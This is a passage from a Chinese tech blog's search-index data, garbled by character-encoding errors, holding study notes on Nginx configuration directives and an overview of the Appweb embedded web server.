å—ä¹‹é—´çš„ä¸€éƒ¨åˆ†å†…å®¹ï¼Œä¸»è¦è®¾ç½®ä¸€äº›å½±å“ Nginx æœåŠ¡å™¨æ•´ä½“è¿è¡Œçš„é…ç½®æŒ‡ä»¤ï¼Œå› æ­¤ï¼Œè¿™äº›æŒ‡ä»¤çš„ä½œç”¨åŸŸæ˜¯ Nginx æœåŠ¡å™¨å…¨å±€ã€‚ é€šå¸¸åŒ…æ‹¬é…ç½®è¿è¡Œ Nginx æœåŠ¡å™¨çš„ç”¨æˆ·ï¼ˆç»„ï¼‰ã€å…è®¸ç”Ÿæˆçš„ worker process æ•°ã€Nginx è¿›ç¨‹ PID å­˜æ”¾è·¯å¾„ã€æ—¥å¿—çš„å­˜æ”¾è·¯å¾„å’Œç±»å‹ä»¥åŠé…ç½®æ–‡ä»¶å¼•å…¥ç­‰ã€‚ # æŒ‡å®šå¯ä»¥è¿è¡ŒnginxæœåŠ¡çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„ï¼Œåªèƒ½åœ¨å…¨å±€å—é…ç½® # user [user] [group] # å°†useræŒ‡ä»¤æ³¨é‡Šæ‰ï¼Œæˆ–è€…é…ç½®æˆnobodyçš„è¯æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥è¿è¡Œ # user nobody nobody; # useræŒ‡ä»¤åœ¨Windowsä¸Šä¸ç”Ÿæ•ˆï¼Œå¦‚æœä½ åˆ¶å®šå…·ä½“ç”¨æˆ·å’Œç”¨æˆ·ç»„ä¼šæŠ¥å°é¢è­¦å‘Š # nginx: [warn] \"user\" is not supported, ignored in D:\\software\\nginx-1.18.0/conf/nginx.conf:2 # æŒ‡å®šå·¥ä½œçº¿ç¨‹æ•°ï¼Œå¯ä»¥åˆ¶å®šå…·ä½“çš„è¿›ç¨‹æ•°ï¼Œä¹Ÿå¯ä½¿ç”¨è‡ªåŠ¨æ¨¡å¼ï¼Œè¿™ä¸ªæŒ‡ä»¤åªèƒ½åœ¨å…¨å±€å—é…ç½® # worker_processes number | autoï¼› # åˆ—å­ï¼šæŒ‡å®š4ä¸ªå·¥ä½œçº¿ç¨‹ï¼Œè¿™ç§æƒ…å†µä¸‹ä¼šç”Ÿæˆä¸€ä¸ªmasterè¿›ç¨‹å’Œ4ä¸ªworkerè¿›ç¨‹ # worker_processes 4; # æŒ‡å®špidæ–‡ä»¶å­˜æ”¾çš„è·¯å¾„ï¼Œè¿™ä¸ªæŒ‡ä»¤åªèƒ½åœ¨å…¨å±€å—é…ç½® # pid logs/nginx.pid; # æŒ‡å®šé”™è¯¯æ—¥å¿—çš„è·¯å¾„å’Œæ—¥å¿—çº§åˆ«ï¼Œæ­¤æŒ‡ä»¤å¯ä»¥åœ¨å…¨å±€å—ã€httpå—ã€serverå—ä»¥åŠlocationå—ä¸­é…ç½®ã€‚(åœ¨ä¸åŒçš„å—é…ç½®æœ‰å•¥åŒºåˆ«ï¼Ÿï¼Ÿ) # å…¶ä¸­debugçº§åˆ«çš„æ—¥å¿—éœ€è¦ç¼–è¯‘æ—¶ä½¿ç”¨--with-debugå¼€å¯debugå¼€å…³ # error_log [path] [debug | info | notice | warn | error | crit | alert | emerg] # error_log logs/error.log notice; # error_log logs/error.log info; 2. events å— events å—æ¶‰åŠçš„æŒ‡ä»¤ä¸»è¦å½±å“ Nginx æœåŠ¡å™¨ä¸ç”¨æˆ·çš„ç½‘ç»œè¿æ¥ã€‚å¸¸ç”¨åˆ°çš„è®¾ç½®åŒ…æ‹¬æ˜¯å¦å¼€å¯å¯¹å¤š worker process ä¸‹çš„ç½‘ç»œè¿æ¥è¿›è¡Œåºåˆ—åŒ–ï¼Œæ˜¯å¦å…è®¸åŒæ—¶æ¥æ”¶å¤šä¸ªç½‘ç»œè¿æ¥ï¼Œé€‰å–å“ªç§äº‹ä»¶é©±åŠ¨æ¨¡å‹å¤„ç†è¿æ¥è¯·æ±‚ï¼Œæ¯ä¸ª worker process å¯ä»¥åŒæ—¶æ”¯æŒçš„æœ€å¤§è¿æ¥æ•°ç­‰ã€‚ è¿™ä¸€éƒ¨åˆ†çš„æŒ‡ä»¤å¯¹ Nginx æœåŠ¡å™¨çš„æ€§èƒ½å½±å“è¾ƒå¤§ï¼Œåœ¨å®é™…é…ç½®ä¸­åº”è¯¥æ ¹æ®å®é™…æƒ…å†µçµæ´»è°ƒæ•´ã€‚ 3. http å— http å—æ˜¯ Nginx æœåŠ¡å™¨é…ç½®ä¸­çš„é‡è¦éƒ¨åˆ†ï¼Œä»£ç†ã€ç¼“å­˜å’Œæ—¥å¿—å®šä¹‰ç­‰ç»å¤§å¤šæ•°çš„åŠŸèƒ½å’Œç¬¬ä¸‰æ–¹æ¨¡å—çš„é…ç½®éƒ½å¯ä»¥æ”¾åœ¨è¿™ä¸ªæ¨¡å—ä¸­ã€‚ å‰é¢å·²ç»æåˆ°ï¼Œhttp å—ä¸­å¯ä»¥åŒ…å«è‡ªå·±çš„å…¨å±€å—ï¼Œä¹Ÿå¯ä»¥åŒ…å« server å—ï¼Œserver å—ä¸­åˆå¯ä»¥è¿›ä¸€æ­¥åŒ…å« location å—ï¼Œåœ¨æœ¬ä¹¦ä¸­æˆ‘ä»¬ä½¿ç”¨ â€œhttp å…¨å±€å—â€ æ¥è¡¨ç¤º http ä¸­è‡ªå·±çš„å…¨å±€å—ï¼Œå³ http å—ä¸­ä¸åŒ…å«åœ¨ server å—ä¸­çš„éƒ¨åˆ†ã€‚ å¯ä»¥åœ¨ http å…¨å±€å—ä¸­é…ç½®çš„æŒ‡ä»¤åŒ…æ‹¬æ–‡ä»¶å¼•å…¥ã€MIME-Type å®šä¹‰ã€æ—¥å¿—è‡ªå®šä¹‰ã€æ˜¯å¦ä½¿ç”¨ sendfile ä¼ è¾“æ–‡ä»¶ã€è¿æ¥è¶…æ—¶æ—¶é—´ã€å•è¿æ¥è¯·æ±‚æ•°ä¸Šé™ç­‰ã€‚ # å¸¸ç”¨çš„æµè§ˆå™¨ä¸­ï¼Œå¯ä»¥æ˜¾ç¤ºçš„å†…å®¹æœ‰HTMLã€XMLã€GIFåŠFlashç­‰ç§ç±»ç¹å¤šçš„æ–‡æœ¬ã€åª’ä½“ç­‰èµ„æºï¼Œæµè§ˆå™¨ä¸ºåŒºåˆ†è¿™äº›èµ„æºï¼Œéœ€è¦ä½¿ç”¨MIME Typeã€‚æ¢è¨€ä¹‹ï¼ŒMIME Typeæ˜¯ç½‘ç»œèµ„æºçš„åª’ä½“ç±»å‹ã€‚NginxæœåŠ¡å™¨ä½œä¸ºWebæœåŠ¡å™¨ï¼Œå¿…é¡»èƒ½å¤Ÿè¯†åˆ«å‰ç«¯è¯·æ±‚çš„èµ„æºç±»å‹ã€‚ # includeæŒ‡ä»¤ï¼Œç”¨äºåŒ…å«å…¶ä»–çš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥æ”¾åœ¨é…ç½®æ–‡ä»¶çš„ä»»ä½•åœ°æ–¹ï¼Œä½†æ˜¯è¦æ³¨æ„ä½ åŒ…å«è¿›æ¥çš„é…ç½®æ–‡ä»¶ä¸€å®šç¬¦åˆé…ç½®è§„èŒƒï¼Œæ¯”å¦‚è¯´ä½ includeè¿›æ¥çš„é…ç½®æ˜¯worker_processesæŒ‡ä»¤çš„é…ç½®ï¼Œè€Œä½ å°†è¿™ä¸ªæŒ‡ä»¤åŒ…å«åˆ°äº†httpå—ä¸­ï¼Œç€è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œä¸Šé¢å·²ç»ä»‹ç»è¿‡worker_processesæŒ‡ä»¤åªèƒ½åœ¨å…¨å±€å—ä¸­ã€‚ # ä¸‹é¢çš„æŒ‡ä»¤å°†mime.typesåŒ…å«è¿›æ¥ï¼Œmime.typeså’Œngin.cfgåŒçº§ç›®å½•ï¼Œä¸åŒçº§çš„è¯éœ€è¦æŒ‡å®šå…·ä½“è·¯å¾„ # include mime.types; # é…ç½®é»˜è®¤ç±»å‹ï¼Œå¦‚æœä¸åŠ æ­¤æŒ‡ä»¤ï¼Œé»˜è®¤å€¼ä¸ºtext/plainã€‚ # æ­¤æŒ‡ä»¤è¿˜å¯ä»¥åœ¨httpå—ã€serverå—æˆ–è€…locationå—ä¸­è¿›è¡Œé…ç½®ã€‚ # default_type application/octet-stream; # access_logé…ç½®ï¼Œæ­¤æŒ‡ä»¤å¯ä»¥åœ¨httpå—ã€serverå—æˆ–è€…locationå—ä¸­è¿›è¡Œè®¾ç½® # åœ¨å…¨å±€å—ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»è¿‡errer_logæŒ‡ä»¤ï¼Œå…¶ç”¨äºé…ç½®Nginxè¿›ç¨‹è¿è¡Œæ—¶çš„æ—¥å¿—å­˜æ”¾å’Œçº§åˆ«ï¼Œæ­¤å¤„æ‰€æŒ‡çš„æ—¥å¿—ä¸å¸¸è§„çš„ä¸åŒï¼Œå®ƒæ˜¯æŒ‡è®°å½•NginxæœåŠ¡å™¨æä¾›æœåŠ¡è¿‡ç¨‹åº”ç­”å‰ç«¯è¯·æ±‚çš„æ—¥å¿— # access_log path [format [buffer=size]] # å¦‚æœä½ è¦å…³é—­access_log,ä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ # access_log off; # log_formatæŒ‡ä»¤ï¼Œç”¨äºå®šä¹‰æ—¥å¿—æ ¼å¼ï¼Œæ­¤æŒ‡ä»¤åªèƒ½åœ¨httpå—ä¸­è¿›è¡Œé…ç½® # log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; # å®šä¹‰äº†ä¸Šé¢çš„æ—¥å¿—æ ¼å¼åï¼Œå¯ä»¥ä»¥ä¸‹é¢çš„å½¢å¼ä½¿ç”¨æ—¥å¿— # access_log logs/access.log main; # å¼€å¯å…³é—­sendfileæ–¹å¼ä¼ è¾“æ–‡ä»¶ï¼Œå¯ä»¥åœ¨httpå—ã€serverå—æˆ–è€…locationå—ä¸­è¿›è¡Œé…ç½® # sendfile on | off; # è®¾ç½®sendfileæœ€å¤§æ•°æ®é‡,æ­¤æŒ‡ä»¤å¯ä»¥åœ¨httpå—ã€serverå—æˆ–locationå—ä¸­é…ç½® # sendfile_max_chunk size; # å…¶ä¸­ï¼Œsizeå€¼å¦‚æœå¤§äº0ï¼ŒNginxè¿›ç¨‹çš„æ¯ä¸ªworker processæ¯æ¬¡è°ƒç”¨sendfile()ä¼ è¾“çš„æ•°æ®é‡æœ€å¤§ä¸èƒ½è¶…è¿‡è¿™ä¸ªå€¼(è¿™é‡Œæ˜¯128kï¼Œæ‰€ä»¥æ¯æ¬¡ä¸èƒ½è¶…è¿‡128k)ï¼›å¦‚æœè®¾ç½®ä¸º0ï¼Œåˆ™æ— é™åˆ¶ã€‚é»˜è®¤å€¼ä¸º0ã€‚ # sendfile_max_chunk 128k; # é…ç½®è¿æ¥è¶…æ—¶æ—¶é—´,æ­¤æŒ‡ä»¤å¯ä»¥åœ¨httpå—ã€serverå—æˆ–locationå—ä¸­é…ç½®ã€‚ # ä¸ç”¨æˆ·å»ºç«‹ä¼šè¯è¿æ¥åï¼ŒNginxæœåŠ¡å™¨å¯ä»¥ä¿æŒè¿™äº›è¿æ¥æ‰“å¼€ä¸€æ®µæ—¶é—´ # timeoutï¼ŒæœåŠ¡å™¨ç«¯å¯¹è¿æ¥çš„ä¿æŒæ—¶é—´ã€‚é»˜è®¤å€¼ä¸º75s;header_timeoutï¼Œå¯é€‰é¡¹ï¼Œåœ¨åº”ç­”æŠ¥æ–‡å¤´éƒ¨çš„Keep-AliveåŸŸè®¾ç½®è¶…æ—¶æ—¶é—´ï¼šâ€œKeep-Alive:timeout= header_timeoutâ€ã€‚æŠ¥æ–‡ä¸­çš„è¿™ä¸ªæŒ‡ä»¤å¯ä»¥è¢«Mozillaæˆ–è€…Konquerorè¯†åˆ«ã€‚ # keepalive_timeout timeout [header_timeout] # ä¸‹é¢é…ç½®çš„å«ä¹‰æ˜¯ï¼Œåœ¨æœåŠ¡å™¨ç«¯ä¿æŒè¿æ¥çš„æ—¶é—´è®¾ç½®ä¸º120 sï¼Œå‘ç»™ç”¨æˆ·ç«¯çš„åº”ç­”æŠ¥æ–‡å¤´éƒ¨ä¸­Keep-AliveåŸŸçš„è¶…æ—¶æ—¶é—´è®¾ç½®ä¸º100 sã€‚ # keepalive_timeout 120s 100s # é…ç½®å•è¿æ¥è¯·æ±‚æ•°ä¸Šé™ï¼Œæ­¤æŒ‡ä»¤å¯ä»¥åœ¨httpå—ã€serverå—æˆ–locationå—ä¸­é…ç½®ã€‚ # NginxæœåŠ¡å™¨ç«¯å’Œç”¨æˆ·ç«¯å»ºç«‹ä¼šè¯è¿æ¥åï¼Œç”¨æˆ·ç«¯é€šè¿‡æ­¤è¿æ¥å‘é€è¯·æ±‚ã€‚æŒ‡ä»¤keepalive_requestsç”¨äºé™åˆ¶ç”¨æˆ·é€šè¿‡æŸä¸€è¿æ¥å‘NginxæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ¬¡æ•°ã€‚é»˜è®¤æ˜¯100 # keepalive_requests number; 4. server å— server å—å’Œ â€œè™šæ‹Ÿä¸»æœºâ€ çš„æ¦‚å¿µæœ‰å¯†åˆ‡è”ç³»ã€‚ è™šæ‹Ÿä¸»æœºï¼Œåˆç§°è™šæ‹ŸæœåŠ¡å™¨ã€ä¸»æœºç©ºé—´æˆ–æ˜¯ç½‘é¡µç©ºé—´ï¼Œå®ƒæ˜¯ä¸€ç§æŠ€æœ¯ã€‚è¯¥æŠ€æœ¯æ˜¯ä¸ºäº†èŠ‚çœäº’è”ç½‘æœåŠ¡å™¨ç¡¬ä»¶æˆæœ¬è€Œå‡ºç°çš„ã€‚è¿™é‡Œçš„ â€œä¸»æœºâ€ æˆ–â€œç©ºé—´â€æ˜¯ç”±å®ä½“çš„æœåŠ¡å™¨å»¶ä¼¸è€Œæ¥ï¼Œç¡¬ä»¶ç³»ç»Ÿå¯ä»¥åŸºäºæœåŠ¡å™¨ç¾¤ï¼Œæˆ–è€…å•ä¸ªæœåŠ¡å™¨ç­‰ã€‚è™šæ‹Ÿä¸»æœºæŠ€æœ¯ä¸»è¦åº”ç”¨","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:2:2","tags":["nginx"],"title":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½•","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"å‚è€ƒæ–‡çŒ® Nginx å®˜ç½‘ æ“ä½œç³»ç»Ÿèƒ½å¦æ”¯æŒç™¾ä¸‡è¿æ¥? Nginx ç³»åˆ—åšå®¢ nginx çš„ default_server å®šä¹‰åŠåŒ¹é…è§„åˆ™ W3C Nginx æ•™ç¨‹ https://www.cnblogs.com/54chensongxia/p/12938929.html ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:3:0","tags":["nginx"],"title":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½•","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Appweb å­¦ä¹ ç¬”è®°","date":"2021-05-14","objectID":"/2021/05/appweb-1/","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"Appweb Learning Notes ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:0:0","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"ä¸€ã€Appwebæ¦‚è¿° Appwebæ˜¯ç”¨äº Web åº”ç”¨ç¨‹åºçš„åµŒå…¥å¼ Web æœåŠ¡å™¨ã€‚ å®ƒé€Ÿåº¦å¿«ï¼Œå…·å¤‡ä¸°å¯Œçš„å®‰å…¨åŠŸèƒ½å¥—ä»¶ã€‚ Appwebé€šè¿‡äº‹ä»¶é©±åŠ¨çš„å¤šçº¿ç¨‹å†…æ ¸æ‰˜ç®¡å¯¹åŠ¨æ€åµŒå…¥å¼ Web åº”ç”¨ç¨‹åºè¿›è¡Œäº†ä¼˜åŒ–ï¼Œå¯ä»¥æä¾›å¿«é€Ÿå“åº”ã€å¿«é€Ÿååé‡å’Œæœ‰æ•ˆå†…å­˜åˆ©ç”¨ç‡ã€‚ å®ƒç»“æ„ç´§å‡‘ï¼Œåªéœ€ä½¿ç”¨ 2MB çš„å†…å­˜ï¼ˆé€šå¸¸ä¸º 2-4MBï¼‰å³å¯åµŒå…¥ã€‚ Appwebå…·æœ‰ä¸€ç»„å¼ºå¤§çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬HTTP/1ã€HTTP/2ã€SSL/TLSã€åŸºæœ¬å’Œæ‘˜è¦èº«ä»½éªŒè¯ã€è™šæ‹Ÿä¸»æœºã€å¯åŠ è½½æ¨¡å—ã€æ²™ç›’èµ„æºé™åˆ¶ã€æ—¥å¿—è®°å½•ã€æœåŠ¡ç›‘æ§è¿‡ç¨‹ä»¥åŠå¹¿æ³›çš„é…ç½®å’Œç¼–è¯‘æ§åˆ¶ã€‚Appwebæ”¯æŒå¤šç§ç½‘ç»œæ¡†æ¶ï¼ŒåŒ…æ‹¬ESPã€PHPã€Pythonã€Perl å’Œ CGIã€‚ ä½œä¸ºéƒ¨ç½²æœ€å¹¿æ³›çš„åµŒå…¥å¼ Web æœåŠ¡å™¨ä¹‹ä¸€ï¼ŒAppwebè¢«ç”¨äºç½‘ç»œè®¾å¤‡ã€ç”µè¯ã€ç§»åŠ¨è®¾å¤‡ã€æ¶ˆè´¹å’ŒåŠå…¬è®¾å¤‡ä»¥åŠé«˜é€Ÿ Web æœåŠ¡ã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:1:0","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"äºŒã€Appwebçš„ä¼˜åŠ¿å’Œç‰¹ç‚¹ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:0","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"1. å¿«é€Ÿå¼€å‘ åˆ›å»ºåŠ¨æ€è®¾å¤‡ç®¡ç†åº”ç”¨ç¨‹åºçš„æœ€ç®€å•ä¸”æœ€å…·æˆæœ¬æ•ˆç›Šçš„æ–¹å¼ã€‚å®ƒå…·æœ‰åµŒå…¥å¼ Web åº”ç”¨ç¨‹åºæ‰€éœ€çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå› æ­¤å¼€å‘å’Œå‘å¸ƒåç»´æŠ¤æˆæœ¬å°†æ˜¾ç€é™ä½ã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:1","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"2. æœ€å°èµ„æºéœ€æ±‚ å¿«é€Ÿå’Œç´§å‡‘ï¼ˆæœ€å°éœ€æ±‚ä»…2MBï¼‰ã€‚å®ƒåªå ç”¨å¾ˆå°‘çš„ç³»ç»Ÿèµ„æºï¼Œå› æ­¤å¯ä»¥å°†é‡è¦çš„ç³»ç»Ÿèµ„æºç”¨äºè¿è¡Œåº”ç”¨ç¨‹åºã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:2","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"3. çµæ´»çš„å¼€å‘ç¯å¢ƒ é«˜åº¦æ¨¡å—åŒ–ï¼Œå› æ­¤æŒ‰ç…§ä¸åŒéœ€æ±‚é€‰æ‹©ä¸åŒçš„åŠŸèƒ½ã€‚å®ƒæ”¯æŒè¿è¡Œæ—¶æ¨¡å—åŠ è½½å’Œå¹¿æ³›çš„ç¼–è¯‘æ—¶æ§åˆ¶ï¼Œè¿™å¯¹äºå¸Œæœ›é‡æ–°ç¼–è¯‘æºç çš„å¼€å‘è€…æ¥è¯´ååˆ†æœ‰ç”¨ã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:3","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"4. å®‰å…¨æ€§å’Œå¯é æ€§ éƒ¨ç½²æœ€å¹¿æ³›çš„åµŒå…¥å¼ Web æœåŠ¡å™¨ä¹‹ä¸€ï¼Œæ‹¥æœ‰å¤§é‡ç”¨æˆ·å¯¹ä»£ç è¿›è¡Œæµ‹è¯•å’Œä¼˜åŒ–ã€‚å®ƒæœ‰ä¸€ä¸ªå¹¿æ³›çš„å›å½’æµ‹è¯•å¥—ä»¶ï¼Œå¯¹äº§å“çš„å‹åŠ›æµ‹è¯•è¿œè¿œè¶…è¿‡æ­£å¸¸ç¯å¢ƒä¸­å¯èƒ½é‡åˆ°çš„é™åˆ¶ã€‚å®Œå–„çš„SSL/TLSã€èº«ä»½éªŒè¯ã€æ²™ç›’æŒ‡ä»¤å’Œé˜²å¾¡æ€§ç­–ç•¥ç­‰åŠŸèƒ½å¯æœ€å¤§ç¨‹åº¦ä¿æŠ¤ç”¨æˆ·å…å—æ”»å‡»ã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:4","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"5. æ€§èƒ½ å…·æœ‰äº‹ä»¶é©±åŠ¨ã€å¤šçº¿ç¨‹å†…æ ¸çš„åŒç±»äº§å“ä¸­æœ€å¿«çš„æ€§èƒ½ã€‚Appwebä½¿ç”¨åŸºäº arena çš„å†…å­˜åˆ†é…å™¨æ¥é˜²æ­¢å†…å­˜æ³„æ¼å¹¶æä¾›æœ€é«˜æ€§èƒ½ï¼Œåœ¨ PC ç±»è®¾å¤‡ä¸Šæ¯ç§’å¯ä»¥å¤„ç†è¶…è¿‡ 40,000 ä¸ªè¯·æ±‚ã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:5","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"6. è§„èŒƒæ€§ æ”¯æŒ HTTP/1.0ã€HTTP/1.1ã€HTTP/2ï¼ˆä»…é™ä¼ä¸šç‰ˆï¼‰ã€CGI/1.1ã€SSL RFC 2246ã€HTTP RFC 2617ç­‰åè®®æ ‡å‡†ã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:6","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"7. å¯ç§»æ¤æ€§ Appweb å·²ç§»æ¤åˆ° Linuxã€Windowsã€Mac OS å’Œ BSDï¼Œå¹¶æ”¯æŒä»¥ä¸‹ CPU æ¶æ„ï¼šARMã€MIPSã€i386/X86/X86_64ã€PowerPCã€SH å’Œ Sparcã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:7","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"ä¸‰ã€åµŒå…¥å¼è®¾å¤‡åº”ç”¨ åœ¨åµŒå…¥å¼è®¾å¤‡æˆ–åº”ç”¨ä¸­ï¼Œweb serveråŠŸèƒ½çš„é‡è¦æ€§æ¬¡äºè®¾å¤‡å¿…é¡»è¿è¡Œçš„åŠŸèƒ½ã€‚å› æ­¤ï¼Œweb server å¿…é¡»æœ€å¤§é™åº¦åœ°å‡å°‘å…¶èµ„æºéœ€æ±‚ï¼Œå¹¶ä¸”ç¡®å®šå®ƒæ”¾ç½®åœ¨ç³»ç»Ÿä¸Šçš„è´Ÿè½½ã€‚ Appweb æ ¹æ®è¿™ç§ç‰¹æ€§è¿›è¡Œæ·±åº¦ä¼˜åŒ–ï¼š å¿«é€Ÿå¹¶ä¸”åªå ç”¨å¾ˆå°çš„å†…å­˜èµ„æºï¼ˆé€šå¸¸ä¸º2-4MBï¼‰ å¯¹ç³»ç»Ÿèµ„æºçš„éœ€æ±‚æœ€å°â€”â€”é€šè¿‡å¯é…ç½®çš„èµ„æºé™åˆ¶ ESP C Web æ¡†æ¶åœ¨ä¸å½±å“å¼€å‘äººå‘˜åŠŸèƒ½çš„æƒ…å†µä¸‹ï¼Œè¿è¡Œæ—¶æ•ˆç‡æœ€é«˜ é»˜è®¤å®‰å…¨ï¼Œå¼€å‘å®‰å…¨ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:3:0","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"å››ã€Appweb å†…éƒ¨ç»„ä»¶ Appweb çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨çš„ã€å¤šçº¿ç¨‹çš„ HTTP pipeï¼Œåœ¨å®ƒä¸Šé¢åŠ è½½æ¨¡å—ä»¥æä¾›ç‰¹å®šäºå†…å®¹çš„å¤„ç†å¹¶æ‰©å±•å…¶åŠŸèƒ½ã€‚ Appweb å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š é«˜æ€§èƒ½å¤šçº¿ç¨‹å†…æ ¸ åŠ¨æ€æ¨¡å—åŠ è½½çš„æ¨¡å—åŒ–ç»“æ„ HTTP/1ï¼Œ HTTP/2 å’ŒWebSocket æ”¯æŒ å¸¦æœ‰è¿‡æ»¤å™¨çš„çµæ´»çš„è¯·æ±‚pipeline å¯ä»¥æœ‰æ•ˆé¿å…å†…å­˜æ³„æ¼çš„å¿«é€Ÿçš„ä¸“ç”¨å†…å­˜åˆ†é…å™¨å’Œåƒåœ¾å›æ”¶ å¯ç§»æ¤è¿è¡Œæ—¶ ä½¿ç”¨æ²™ç›’æ§åˆ¶èµ„æºæ¶ˆè€— å®‰å…¨å¯é çš„è¿è¡Œæ—¶å¯é˜²æ­¢å¸¸è§çš„å®‰å…¨æ¼æ´ï¼Œä¾‹å¦‚ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ å…¼å®¹Apacheé…ç½® å…¨é¢çš„æ—¥å¿—å’Œè°ƒè¯•è·Ÿè¸ª ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:0","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"1. Routing Engine åœ¨ç°ä»£ Web åº”ç”¨ç¨‹åºä¸­ï¼Œä¸€èˆ¬éœ€è¦æ ¹æ®åŠŸèƒ½å¯¹åº”ç”¨ç¨‹åºçš„ä¸åŒéƒ¨åˆ†è¿›è¡Œåˆ’åˆ†ï¼Œå¹¶å¯¹å„ä¸ªéƒ¨åˆ†è¿›è¡Œä¸åŒçš„å¤„ç†ã€‚ ä¾‹å¦‚å¯èƒ½åªæƒ³å°†è®¿é—®æƒé™é™åˆ¶ä¸ºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œæˆ–è€…å¸Œæœ›ç¼“å­˜ä¸€äº›ç¼“æ…¢å˜åŒ–ä½†åŠ¨æ€çš„æ•°æ®çš„è¾“å‡ºï¼Œæˆ–è€…å¯èƒ½æƒ³è¦ä½¿ç”¨ RESTful URIï¼ˆå…¶ä¸­ URI çš„å«ä¹‰å–å†³äº HTTP methodï¼‰ã€‚ åŸå› æœ‰å¾ˆå¤šï¼Œä½† Web æœåŠ¡å™¨å¿…é¡»æä¾›ä¸€ç§æ–¹æ³•æ¥ä»¥ä¸åŒæ–¹å¼å¤„ç†å„ç§ URI çš„å¤„ç†ï¼Œ Appweb åŒæ ·æä¾›äº†è·¯ç”±å¼•æ“æ¥å¤„ç†è¯¥é—®é¢˜ã€‚ Appweb å…·æœ‰é«˜æ•ˆçµæ´»çš„è·¯ç”±å¼•æ“ï¼Œå…è®¸ä»¥ä¸åŒæ–¹å¼å¤„ç†ï¼ˆè·¯ç”±ï¼‰URI groupã€‚ è·¯ç”±åœ¨ appweb.conf é…ç½®æ–‡ä»¶ä¸­åˆ›å»ºï¼Œä½¿ç”¨ Route å®šä¹‰ä¸€ç»„é€‚ç”¨äº URI ç»„çš„å¤„ç†æŒ‡ä»¤ã€‚ Route æŒ‡ä»¤æŒ‡å®šç¬¦åˆæ¡ä»¶çš„è¯·æ±‚æ‰€å¿…é¡»åŒ¹é…çš„ URI å‰ç¼€ï¼ŒåŒ¹é…ç­–ç•¥å¯ä»¥æ˜¯ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼ã€‚ å¯ä»¥åˆ›å»ºä»»æ„æ•°é‡çš„è·¯ç”±ï¼Œå¹¶æŒ‰ç…§å®ƒä»¬åœ¨ appweb.conf æ–‡ä»¶ä¸­å®šä¹‰çš„é¡ºåºè¿›è¡Œå¤„ç†ã€‚ è·¯ç”±ä¹Ÿå¯ä»¥åµŒå¥—ï¼Œä»¥ä¾¿å†…éƒ¨è·¯ç”±ç»§æ‰¿å¤–éƒ¨è·¯ç”±å—çš„å®šä¹‰ã€‚ 